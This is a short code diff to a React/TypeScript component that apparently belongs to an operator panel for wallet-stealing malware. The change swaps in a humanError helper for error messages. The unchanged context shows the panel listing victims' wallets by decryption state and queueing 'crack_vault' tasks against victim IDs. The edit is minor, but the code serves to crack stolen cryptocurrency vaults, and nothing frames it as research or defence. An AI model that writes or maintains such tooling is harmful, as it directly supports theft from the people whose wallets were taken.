@@ -10,6 +10,7 @@ import { balanceNumber, balanceTone, copy, dateTime, mask } from '@/lib/format';
 import { mutate } from '@/hooks/useApi';
 import { useCanWrite } from '@/components/live-provider';
 import { cn } from '@/lib/cn';
+import { humanError } from '@/lib/errors';
 
 const tone = (state: string) => state === 'decrypted' ? 'ok' : state === 'locked' ? 'warn' : state === 'corrupt' ? 'bad' : 'default';
 
@@ -25,7 +26,7 @@ export function WalletTable({ victimId, items, loading, refresh, linked = true }
       await mutate('/tasks', 'POST', { victim_ids: [victimId], name: 'crack_vault', params: { target: wallet.targetId }, timeout_sec: 180 });
       toast.success('Descifrado en cola');
     } catch (error) {
-      toast.error(error instanceof Error ? error.message : 'No se pudo encolar');
+      toast.error(humanError(error) || 'No se pudo encolar');
     } finally {
       setBusy('');
     }
